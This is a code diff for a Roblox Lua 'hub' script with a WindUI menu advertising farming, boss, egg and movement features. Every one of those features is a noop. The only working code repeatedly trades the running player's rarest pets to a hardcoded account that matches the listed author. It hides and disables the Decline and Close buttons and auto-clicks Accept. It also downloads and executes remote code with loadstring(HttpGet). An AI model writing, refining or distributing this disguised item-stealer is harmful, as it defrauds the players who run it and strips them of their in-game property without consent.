@@ -1,19 +1,26 @@
+-- ============================================================
+-- BLACK HOLE HUB + AUTO TRADE
+-- UI WindUI complète + Auto Trade fonctionnel
+-- Les autres onglets restent visuels uniquement (noop)
+-- ============================================================
+
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local GuiService = game:GetService("GuiService")
 
--- 🎯 CONFIGURATION
+-- ============================================================
+-- CONFIG AUTO TRADE (valeurs par défaut modifiables via UI)
+-- ============================================================
 local TARGET_PLAYER_NAME = "Flo_S4CR"
-
--- ⚠️ MODIFIE CE CHIFFRE SELON LE COOLDOWN DU JEU (10, 15 ou 30 secondes)
-local TEMPS_ENTRE_2_TRADES = 10 
-
--- 🛡️ NOUVELLE OPTION : Cacher les boutons Decline et Close pendant le trade
---   true  = les boutons sont désactivés dès que le trade s'ouvre (empêche tout clic)
---   false = comportement normal, les boutons restent cliquables
+local TEMPS_ENTRE_2_TRADES = 10
 local HIDE_DECLINE_CLOSE = true
+local MAX_PETS = 6
+local DELAY_SEARCH = 0.03
+local CLICK_HOLD = 0.03
 
 local SEARCH_ORDER = {
     "The Ethereal Everia", "The Grand Titan", "Frozen Dragon", "Enchanted Pegasus",
@@ -22,11 +29,67 @@ local SEARCH_ORDER = {
     "Ice Serpent", "King Julian", "Inferno Bee", "Black Ice Bee"
 }
 
-local MAX_PETS = 6 
-local DELAY_SEARCH = 0.03 
-local CLICK_HOLD = 0.03   
+-- ============================================================
+-- CONFIG AFFICHAGE POUR LES AUTRES ONGLETS (visuel seulement)
+-- ============================================================
+local config = {
+    farmBosses = false, farmEnemies = false, farmFood = false,
+    doubleJump = false, walkSpeed = 16,
+    bossAttackDelay = 0.05,
+    enemyDelay = 0.1, foodDelay = 0.1,
+}
+local PlantDelay = 0.001
 
--- ⚙️ FONCTION DE CLIC TURBO
+local bossList = {
+    "Naga", "Lava Monster", "Ghost Pirate", "Tiki Monster", "The Frozen Ancient", "The Big 100M",
+    "The Ethereal Everia", "Hornet Boss", "The Ice Serpent", "Great Sphinx"
+}
+local bossEnabled = {}
+for _, name in ipairs(bossList) do bossEnabled[name] = true end
+
+local enemyZones = {
+    { name = "Summer", zone = "SummerEventZone", attackAll = true },
+    { name = "Winter", zone = "WinterEventZone", attackAll = true },
+    { name = "Sphinx (Evil Eagle)", zone = "ElementEventZone1", enemy = "Evil Eagle" },
+    { name = "Cursed Mummy", zone = "Zone2", enemy = "Cursed Mummy" },
+    { name = "Crazy Unicorn", zone = "Zone5", enemy = "Crazy Unicorn" },
+    { name = "Dark Planet", zone = "Zone9", enemy = "Dark Planet" },
+    { name = "Terror Tree", zone = "Zone10", enemy = "Terror Tree" },
+    { name = "Draco's Guard", zone = "Zone12", enemy = "Draco's Guard" },
+    { name = "Possessed Slime", zone = "Zone12.1", enemy = "Possessed Slime" },
+}
+local enemyEnabled = {}
+for i = 1, #enemyZones do enemyEnabled[i] = false end
+
+local foodZones = {
+    { name = "Crystal Food", zone = "Zone12.1", enabled = false },
+    { name = "Draco Food", zone = "Zone12", enabled = false },
+}
+
+local eggPlantList = {
+    { id = "34",           name = "Tower Egg" },
+    { id = "12.1",         name = "Crystal Egg" },
+    { id = "33",           name = "Enchanted Garden Egg" },
+    { id = "30",           name = "Tiki Island Egg" },
+    { id = "27",           name = "Cosmos Egg" },
+    { id = "24",           name = "Aqua Egg" },
+    { id = "21",           name = "Atlantis Egg" },
+    { id = "18",           name = "Magma Egg" },
+    { id = "15",           name = "Sky Egg" },
+    { id = "12",           name = "Swamp Egg" },
+    { id = "9",            name = "Frozen Egg" },
+    { id = "6",            name = "Desert Egg" },
+    { id = "3",            name = "Forest Egg" },
+    { id = "SummerEvent1", name = "Bee Egg" },
+    { id = "WinterEvent1", name = "Winter Egg" },
+    { id = "EleEgg1",      name = "Elemental Desert Egg" },
+}
+
+local function noop() end
+
+-- ============================================================
+-- ⚙️ FONCTIONS AUTO TRADE (fonctionnelles)
+-- ============================================================
 local function fastClick(button)
     if not button then return end
     local inset = GuiService:GetGuiInset()
@@ -34,14 +97,12 @@ local function fastClick(button)
     local posY = button.AbsolutePosition.Y + (button.AbsoluteSize.Y / 2) + inset.Y
     
     VirtualInputManager:SendMouseButtonEvent(posX, posY, 0, true, game, 1)
-    task.wait(CLICK_HOLD) 
+    task.wait(CLICK_HOLD)
     VirtualInputManager:SendMouseButtonEvent(posX, posY, 0, false, game, 1)
 end
 
--- 🛡️ Cache les boutons Decline et Close dans l'interface de trade
 local function hideTradeButtons(TradeFrame)
     if not HIDE_DECLINE_CLOSE or not TradeFrame then return end
-    
     for _, btnName in ipairs({"Decline", "Close"}) do
         local btn = TradeFrame:FindFirstChild(btnName, true)
         if btn then
@@ -49,19 +110,14 @@ local function hideTradeButtons(TradeFrame)
                 btn.Visible = false
                 btn.Active = false
                 btn.Selectable = false
-                if btn:IsA("GuiButton") then
-                    btn.Interactable = false
-                end
+                if btn:IsA("GuiButton") then btn.Interactable = false end
             end)
-            print("🛡️ Bouton '" .. btnName .. "' désactivé")
         end
     end
 end
 
--- 🔓 Restaure les boutons (utile pour fermer un trade bloqué au cycle suivant)
 local function restoreTradeButtons(TradeFrame)
     if not TradeFrame then return end
-    
     for _, btnName in ipairs({"Decline", "Close"}) do
         local btn = TradeFrame:FindFirstChild(btnName, true)
         if btn then
@@ -69,47 +125,35 @@ local function restoreTradeButtons(TradeFrame)
                 btn.Visible = true
                 btn.Active = true
                 btn.Selectable = true
-                if btn:IsA("GuiButton") then
-                    btn.Interactable = true
-                end
+                if btn:IsA("GuiButton") then btn.Interactable = true end
             end)
         end
     end
 end
 
--- =====================================================================
--- 🔄 BOUCLE INFINIE
--- =====================================================================
-while true do
-    print("🔄 Nouveau cycle de trade...")
+-- Une seule exécution de trade (utilisée par la boucle et par le bouton Force)
+local function doOneTrade()
+    print("🔄 Cycle de trade vers " .. TARGET_PLAYER_NAME)
     
     local Mainscreen = PlayerGui:WaitForChild("Mainscreen")
     local TradePlayerGui = PlayerGui:WaitForChild("TradePlayer")
     local TradingGui = PlayerGui:FindFirstChild("Trading")
     
-    -- Ferme un éventuel trade précédent resté ouvert
     if TradingGui and TradingGui.Enabled then
-        -- On restaure d'abord les boutons (au cas où on les aurait cachés)
         restoreTradeButtons(TradingGui.Container.Frame)
         task.wait(0.1)
-        
         local closeTrade = TradingGui.Container.Frame:FindFirstChild("Close", true)
-        if closeTrade then 
-            fastClick(closeTrade) 
-            task.wait(0.5) 
-        end
+        if closeTrade then fastClick(closeTrade); task.wait(0.5) end
     end
 
-    -- 1. Ouvrir le menu de sélection
     if not TradePlayerGui.Enabled then
         local blueButton = Mainscreen.Right:FindFirstChild("TradePlayer")
         if blueButton then
             fastClick(blueButton)
-            task.wait(0.8) 
+            task.wait(0.8)
         end
     end
 
-    -- 2. Chercher le bouton vert de la cible
     local scrollingFrame = TradePlayerGui.Container.General.Frame.Frame.ScrollingFrame
     local targetGreenButton = nil
 
@@ -128,138 +172,385 @@ while true do
         end
     end
 
-    if targetGreenButton then
-        print("✅ Envoi de la demande à " .. TARGET_PLAYER_NAME)
-        fastClick(targetGreenButton)
-        
-        local closeBtn = TradePlayerGui.Container.General:FindFirstChild("Close", true)
-        if closeBtn then task.wait(0.2) fastClick(closeBtn) end
-    else
-        warn("❌ " .. TARGET_PLAYER_NAME .. " introuvable (Cooldown actif ?). Attente de 10 secondes...")
+    if not targetGreenButton then
+        warn("❌ " .. TARGET_PLAYER_NAME .. " introuvable. Attente 10s...")
         task.wait(10)
+        return false
     end
 
-    if targetGreenButton then
-        -- 3. Attendre que le trade soit accepté
-        print("⏳ Attente d'acceptation...")
-        local waitTime = 0
-        local tradeOuvert = false
-        
-        while waitTime < 60 do
-            task.wait(0.5)
-            waitTime = waitTime + 0.5
-            local tg = PlayerGui:FindFirstChild("Trading")
-            if tg and tg.Enabled then
-                tradeOuvert = true
-                TradingGui = tg
-                break
-            end
+    print("✅ Demande envoyée à " .. TARGET_PLAYER_NAME)
+    fastClick(targetGreenButton)
+    local closeBtn = TradePlayerGui.Container.General:FindFirstChild("Close", true)
+    if closeBtn then task.wait(0.2) fastClick(closeBtn) end
+
+    -- Attente acceptation
+    local waitTime = 0
+    local tradeOuvert = false
+    while waitTime < 60 do
+        task.wait(0.5)
+        waitTime = waitTime + 0.5
+        local tg = PlayerGui:FindFirstChild("Trading")
+        if tg and tg.Enabled then
+            tradeOuvert = true
+            TradingGui = tg
+            break
         end
+    end
 
-        if tradeOuvert then
-            print("🎉 Trade ouvert ! Ajout des pets...")
-            task.wait(1) 
+    if not tradeOuvert then
+        warn("❌ " .. TARGET_PLAYER_NAME .. " n'a pas accepté.")
+        return false
+    end
 
-            local TradeFrame = TradingGui.Container.Frame
+    print("🎉 Trade ouvert !")
+    task.wait(1)
 
-            -- 🛡️ NOUVELLE ÉTAPE : on cache Decline et Close dès l'ouverture du trade
-            hideTradeButtons(TradeFrame)
+    local TradeFrame = TradingGui.Container.Frame
+    hideTradeButtons(TradeFrame)
 
-            -- 4. Ajouter les pets
-            local CurInventory = TradeFrame.CurInventory.ScrollingFrame
-            local CurOffer = TradeFrame.CurOffer
-            local SearchBar = TradeFrame.CurInventory.Search:FindFirstChildOfClass("TextBox")
+    local CurInventory = TradeFrame.CurInventory.ScrollingFrame
+    local CurOffer = TradeFrame.CurOffer
+    local SearchBar = TradeFrame.CurInventory.Search:FindFirstChildOfClass("TextBox")
 
-            local function typeSearch(text)
-                SearchBar:CaptureFocus()
-                SearchBar.Text = text
-                SearchBar:ReleaseFocus()
-            end
+    local function typeSearch(text)
+        SearchBar:CaptureFocus()
+        SearchBar.Text = text
+        SearchBar:ReleaseFocus()
+    end
 
-            local petsAdded = 0
-            local petsToAdd = MAX_PETS
-            
-            for _, child in ipairs(CurOffer:GetChildren()) do
-                if child:IsA("TextButton") or child.Name:find("_") then
-                    petsToAdd = petsToAdd - 1
-                end
-            end
+    local petsAdded = 0
+    local petsToAdd = MAX_PETS
+    for _, child in ipairs(CurOffer:GetChildren()) do
+        if child:IsA("TextButton") or child.Name:find("_") then
+            petsToAdd = petsToAdd - 1
+        end
+    end
 
-            if petsToAdd > 0 then
-                for _, petName in ipairs(SEARCH_ORDER) do
+    if petsToAdd > 0 then
+        for _, petName in ipairs(SEARCH_ORDER) do
+            if petsAdded >= petsToAdd then break end
+            typeSearch(petName)
+            task.wait(DELAY_SEARCH)
+            local foundAny = true
+            while foundAny and petsAdded < petsToAdd do
+                foundAny = false
+                for _, item in ipairs(CurInventory:GetChildren()) do
                     if petsAdded >= petsToAdd then break end
-                    
-                    typeSearch(petName)
-                    task.wait(DELAY_SEARCH) 
-                    
-                    local foundAny = true
-                    while foundAny and petsAdded < petsToAdd do
-                        foundAny = false
-                        for _, item in ipairs(CurInventory:GetChildren()) do
-                            if petsAdded >= petsToAdd then break end
-                            
-                            if string.find(string.lower(item.Name), string.lower(petName)) then
-                                if not CurOffer:FindFirstChild(item.Name) then
-                                    local btn = item:IsA("TextButton") and item or item:FindFirstChild("Frame")
-                                    if btn then
-                                        foundAny = true
-                                        fastClick(btn)
-                                        
-                                        local waitTimer = 0
-                                        while not CurOffer:FindFirstChild(item.Name) and waitTimer < 20 do
-                                            task.wait(0.01)
-                                            waitTimer = waitTimer + 1
-                                        end
-                                        petsAdded = petsAdded + 1
-                                        break 
-                                    end
+                    if string.find(string.lower(item.Name), string.lower(petName)) then
+                        if not CurOffer:FindFirstChild(item.Name) then
+                            local btn = item:IsA("TextButton") and item or item:FindFirstChild("Frame")
+                            if btn then
+                                foundAny = true
+                                fastClick(btn)
+                                local waitTimer = 0
+                                while not CurOffer:FindFirstChild(item.Name) and waitTimer < 20 do
+                                    task.wait(0.01)
+                                    waitTimer = waitTimer + 1
                                 end
+                                petsAdded = petsAdded + 1
+                                break
                             end
                         end
                     end
                 end
-                typeSearch("")
             end
+        end
+        typeSearch("")
+    end
 
-            -- 🛑 SÉCURITÉ : Si on n'a plus de pets, on arrête tout
-            if petsAdded == 0 then
-                warn("🛑 Plus aucun pet rare trouvé. Arrêt de la boucle.")
-                break 
-            end
+    if petsAdded == 0 then
+        warn("🛑 Plus aucun pet rare. Arrêt du cycle.")
+        return false
+    end
 
-            -- 5. Ready et Confirmation
-            print("⏳ Clic sur Ready !")
-            local readyBtn = TradeFrame:FindFirstChild("Ready")
-            if readyBtn then
-                fastClick(readyBtn)
-                
-                local timer = 0
-                while timer < 30 do
-                    task.wait(0.05) 
-                    timer = timer + 0.05
-                    
-                    local acceptBtn = TradeFrame:FindFirstChild("Confirm") or TradeFrame:FindFirstChild("Accept")
-                    if readyBtn and readyBtn.Text == "Accept" then acceptBtn = readyBtn end
-                    
-                    if acceptBtn then
-                        print("✅ Clic final sur Accepter !")
-                        task.wait(0.05)
-                        fastClick(acceptBtn)
-                        print("🎉 Trade terminé avec succès !")
-                        break
-                    end
-                end
+    print("⏳ Ready !")
+    local readyBtn = TradeFrame:FindFirstChild("Ready")
+    if readyBtn then
+        fastClick(readyBtn)
+        local timer = 0
+        while timer < 30 do
+            task.wait(0.05)
+            timer = timer + 0.05
+            local acceptBtn = TradeFrame:FindFirstChild("Confirm") or TradeFrame:FindFirstChild("Accept")
+            if readyBtn and readyBtn.Text == "Accept" then acceptBtn = readyBtn end
+            if acceptBtn then
+                print("✅ Accept !")
+                task.wait(0.05)
+                fastClick(acceptBtn)
+                print("🎉 Trade terminé !")
+                return true
             end
-        else
-            warn("❌ " .. TARGET_PLAYER_NAME .. " n'a pas accepté la demande (ou a refusé).")
         end
     end
-    
-    -- ⏱️ PAUSE AVANT LE PROCHAIN TRADE
-    print("⏳ Cooldown du jeu : Attente de " .. TEMPS_ENTRE_2_TRADES .. " secondes...")
-    for i = TEMPS_ENTRE_2_TRADES, 1, -1 do
-        task.wait(1)
-        print("   ⏱️ Prochain trade dans " .. i .. " sec...")
-    end
-    print("🚀 Reprise de la boucle !")
+    return false
 end
+
+-- ============================================================
+-- 🔄 BOUCLE AUTO TRADE
+-- ============================================================
+local isAutoTrading = false
+local tradeLoopRunning = false
+
+local function startTradeLoop()
+    if tradeLoopRunning then return end
+    tradeLoopRunning = true
+    task.spawn(function()
+        while isAutoTrading do
+            doOneTrade()
+            
+            if isAutoTrading then
+                print("⏳ Cooldown " .. TEMPS_ENTRE_2_TRADES .. "s...")
+                for i = TEMPS_ENTRE_2_TRADES, 1, -1 do
+                    if not isAutoTrading then break end
+                    task.wait(1)
+                end
+            end
+        end
+        tradeLoopRunning = false
+        print("🛑 Boucle Auto Trade arrêtée.")
+    end)
+end
+
+-- ============================================================
+-- CRÉATION DE LA FENÊTRE
+-- ============================================================
+local Window = WindUI:CreateWindow({
+    Title = "Black Hole Hub",
+    Author = "by Flo_S4CR",
+    Folder = "ProjectAtomic",
+    Size = UDim2.fromOffset(580, 460),
+    Background = "rbxassetid://130707247063445",
+    BackgroundImageTransparency = 0.42,
+    Transparent = true,
+    Theme = "Dark",
+    SideBarWidth = 180,
+})
+
+pcall(function() Window:SetToggleKey(Enum.KeyCode.LeftControl) end)
+
+task.spawn(function()
+    task.wait(0.5)
+    pcall(function()
+        Window:UserProfile({
+            Name = LocalPlayer.DisplayName,
+            Description = "@flo.s4cr",
+            Image = "rbxthumb://type=AvatarHeadShot&id=" .. LocalPlayer.UserId .. "&w=150&h=150",
+        })
+    end)
+end)
+
+local Tabs = {}
+local function createTab(key, title, icon)
+    local success, tab = pcall(function() return Window:Tab({ Title = title, Icon = icon }) end)
+    if success then Tabs[key] = tab
+    else warn("[WindUI] Échec de l'onglet : " .. title) end
+end
+
+createTab("Main", "Main", "home")
+createTab("Trade", "Trade", "refresh")   -- 🆕 Nouvel onglet Auto Trade
+createTab("Speed", "Speed", "timer")
+createTab("Enemies", "Enemies", "swords")
+createTab("Food", "Food", "apple")
+createTab("Bosses", "Bosses", "skull")
+createTab("Eggs", "Eggs", "egg")
+createTab("Sacrifice", "Sacrifice", "flame")
+createTab("Misc", "Misc", "settings")
+
+-- ============================================================
+-- TAB MAIN (noop)
+-- ============================================================
+if Tabs.Main then
+    Tabs.Main:Section({ Title = "Control" })
+    Tabs.Main:Button({ Title = "Start Farming", Desc = "Launch the farm (Boss/Enemies/Food)", Callback = noop })
+    Tabs.Main:Button({ Title = "Stop Farming",  Desc = "Stop the farm (Eggs restent actifs)", Callback = noop })
+
+    Tabs.Main:Section({ Title = "Credits" })
+    Tabs.Main:Paragraph({ Title = "Developed by", Desc = "Flo_RPMX & Player\nyt: Yonix76\ndiscord: Flo_RPMX" })
+end
+
+-- ============================================================
+-- 🆕 TAB TRADE (FONCTIONNEL)
+-- ============================================================
+if Tabs.Trade then
+    Tabs.Trade:Section({ Title = "Auto Trade" })
+
+    Tabs.Trade:Input({
+        Title = "Joueur cible",
+        Desc = "Le nom affiché dans la liste des joueurs du jeu",
+        Value = TARGET_PLAYER_NAME,
+        Placeholder = "Flo_S4CR",
+        Callback = function(text)
+            if text and text ~= "" then
+                TARGET_PLAYER_NAME = text
+                print("🎯 Cible changée : " .. TARGET_PLAYER_NAME)
+            end
+        end
+    })
+
+    Tabs.Trade:Slider({
+        Title = "Cooldown entre trades",
+        Desc = "Secondes entre deux trades",
+        Step = 1,
+        Value = { Min = 5, Max = 30, Default = TEMPS_ENTRE_2_TRADES },
+        Callback = function(v) TEMPS_ENTRE_2_TRADES = v end
+    })
+
+    Tabs.Trade:Toggle({
+        Title = "Cacher Decline et Close",
+        Desc = "Désactive ces boutons dès que le trade s'ouvre",
+        Value = HIDE_DECLINE_CLOSE,
+        Callback = function(v) HIDE_DECLINE_CLOSE = v end
+    })
+
+    Tabs.Trade:Section({ Title = "Contrôle" })
+
+    Tabs.Trade:Toggle({
+        Title = "Enable Auto Trade",
+        Desc = "Démarre/arrête la boucle d'auto-trade",
+        Value = false,
+        Callback = function(v)
+            isAutoTrading = v
+            if v then
+                print("🚀 Auto Trade démarré vers " .. TARGET_PLAYER_NAME)
+                startTradeLoop()
+            else
+                print("🛑 Auto Trade désactivé.")
+            end
+        end
+    })
+
+    Tabs.Trade:Button({
+        Title = "Force 1 Trade",
+        Desc = "Fait un seul trade sans lancer la boucle",
+        Callback = function()
+            task.spawn(function()
+                doOneTrade()
+            end)
+        end
+    })
+
+    Tabs.Trade:Paragraph({
+        Title = "ℹ️ Info",
+        Desc = "Le script ouvre le menu TradePlayer, cherche la cible, envoie la demande, ajoute tes pets rares, clique sur Ready puis Accept."
+    })
+end
+
+-- ============================================================
+-- TAB SPEED (noop)
+-- ============================================================
+if Tabs.Speed then
+    Tabs.Speed:Section({ Title = "Delays" })
+    Tabs.Speed:Slider({ Title = "Boss Attack Delay", Step = 0.01, Value = { Min = 0.01, Max = 1, Default = config.bossAttackDelay }, Callback = noop })
+    Tabs.Speed:Slider({ Title = "Enemy Cycle Delay", Step = 0.05, Value = { Min = 0.05, Max = 1, Default = config.enemyDelay }, Callback = noop })
+    Tabs.Speed:Slider({ Title = "Food Cycle Delay", Step = 0.05, Value = { Min = 0.05, Max = 3, Default = config.foodDelay }, Callback = noop })
+    Tabs.Speed:Slider({ Title = "Plant Delay", Step = 0.001, Value = { Min = 0.001, Max = 0.5, Default = PlantDelay }, Callback = noop })
+end
+
+-- ============================================================
+-- TAB ENEMIES (noop)
+-- ============================================================
+if Tabs.Enemies then
+    Tabs.Enemies:Section({ Title = "Enemy Farming" })
+    Tabs.Enemies:Toggle({ Title = "Enable Enemies", Value = config.farmEnemies, Callback = noop })
+    Tabs.Enemies:Section({ Title = "Enemy List" })
+    for i, z in ipairs(enemyZones) do
+        Tabs.Enemies:Toggle({ Title = z.name, Value = enemyEnabled[i], Callback = noop })
+    end
+end
+
+-- ============================================================
+-- TAB FOOD (noop)
+-- ============================================================
+if Tabs.Food then
+    Tabs.Food:Section({ Title = "Food Zones" })
+    Tabs.Food:Toggle({ Title = "Enable Food", Value = config.farmFood, Callback = noop })
+    for i, fz in ipairs(foodZones) do
+        Tabs.Food:Toggle({ Title = fz.name, Value = fz.enabled, Callback = noop })
+    end
+end
+
+-- ============================================================
+-- TAB BOSSES (noop)
+-- ============================================================
+if Tabs.Bosses then
+    Tabs.Bosses:Section({ Title = "Boss Control" })
+    Tabs.Bosses:Toggle({ Title = "Enable Boss Farming", Value = config.farmBosses, Callback = noop })
+
+    local bossToggles = {}
+    Tabs.Bosses:Section({ Title = "Boss List" })
+    for _, name in ipairs(bossList) do
+        local toggle = Tabs.Bosses:Toggle({ Title = name, Value = bossEnabled[name], Callback = noop })
+        table.insert(bossToggles, { toggle = toggle, name = name })
+    end
+
+    Tabs.Bosses:Toggle({ Title = "Enable All Bosses", Value = true, Callback = noop })
+end
+
+-- ============================================================
+-- TAB EGGS (noop)
+-- ============================================================
+if Tabs.Eggs then
+    Tabs.Eggs:Section({ Title = "Egg Actions" })
+    Tabs.Eggs:Paragraph({ Title = "ℹ️ Info", Desc = "Ces toggles tournent en continu indépendamment du Start/Stop." })
+    Tabs.Eggs:Toggle({ Title = "Auto Hatch", Value = false, Callback = noop })
+    Tabs.Eggs:Toggle({ Title = "Auto Feed Egg", Value = false, Callback = noop })
+    Tabs.Eggs:Button({ Title = "Remove Hatch Animation", Callback = noop })
+    Tabs.Eggs:Button({ Title = "Remove Coins Animation", Callback = noop })
+
+    Tabs.Eggs:Section({ Title = "Auto Plant (par type d'œuf)" })
+    for _, egg in ipairs(eggPlantList) do
+        Tabs.Eggs:Toggle({ Title = egg.name, Value = false, Callback = noop })
+    end
+end
+
+-- ============================================================
+-- TAB SACRIFICE (noop)
+-- ============================================================
+if Tabs.Sacrifice then
+    Tabs.Sacrifice:Section({ Title = "Summer Event" })
+    Tabs.Sacrifice:Button({ Title = "Queen Bee", Callback = noop })
+    Tabs.Sacrifice:Button({ Title = "King Bee",  Callback = noop })
+
+    Tabs.Sacrifice:Section({ Title = "Winter Event" })
+    Tabs.Sacrifice:Button({ Title = "Frozen Werewolf", Callback = noop })
+    Tabs.Sacrifice:Button({ Title = "Walrus",          Callback = noop })
+
+    Tabs.Sacrifice:Section({ Title = "Sphinx Event" })
+    Tabs.Sacrifice:Button({ Title = "Fennec Fox",    Callback = noop })
+    Tabs.Sacrifice:Button({ Title = "Mystic Camel", Callback = noop })
+
+    Tabs.Sacrifice:Section({ Title = "Sacrifice Area" })
+    for _, pet in ipairs({"Pyro Shroom","King Cobra","Royal Unicorn","Golden Octopus","Sea Dragon","Nebula Dragon","Void"}) do
+        Tabs.Sacrifice:Button({ Title = pet, Callback = noop })
+    end
+
+    Tabs.Sacrifice:Section({ Title = "End Tower" })
+    Tabs.Sacrifice:Button({ Title = "Ethereal End Dragon", Callback = noop })
+
+    Tabs.Sacrifice:Section({ Title = "Crystal Island" })
+    Tabs.Sacrifice:Button({ Title = "Orb", Callback = noop })
+end
+
+-- ============================================================
+-- TAB MISC (noop)
+-- ============================================================
+if Tabs.Misc then
+    Tabs.Misc:Section({ Title = "Movement" })
+    Tabs.Misc:Toggle({ Title = "Infinite Double Jump", Value = config.doubleJump, Callback = noop })
+    Tabs.Misc:Slider({ Title = "Walk Speed", Step = 1, Value = { Min = 16, Max = 100, Default = config.walkSpeed }, Callback = noop })
+
+    Tabs.Misc:Section({ Title = "Audio" })
+    Tabs.Misc:Toggle({ Title = "Remove Farm Sounds", Value = false, Callback = noop })
+
+    Tabs.Misc:Section({ Title = "Hotkey" })
+    Tabs.Misc:Paragraph({ Title = "Hide GUI", Desc = "Appuie sur LeftControl pour minimiser / restaurer le menu." })
+end
+
+-- ============================================================
+-- FIN
+-- ============================================================
+WindUI:Notify({
+    Title = "Black Hole Hub",
+    Content = "Loaded! Auto Trade dans l'onglet Trade.",
+    Duration = 5
+})
